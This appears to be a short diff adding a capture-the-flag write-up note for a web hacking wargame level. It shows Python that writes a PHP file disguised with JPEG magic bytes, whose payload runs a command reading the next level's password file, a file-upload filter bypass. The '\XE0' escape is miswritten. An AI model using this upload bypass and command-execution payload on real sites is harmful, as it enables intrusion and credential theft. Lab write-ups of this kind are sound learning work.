@@ -1,0 +1,5 @@
+Same as the previous one, but add the exif tag to the begining of the file to make it seem like an image. I did this with python.
+>>> fh = open('inject.php', 'w')
+>>> fh.write('\xFF\xD8\xFF\XE0' + '<?echo exec(\'cat /etc/natas_webpass/natas14\');?>')
+>>> fh.close()
+
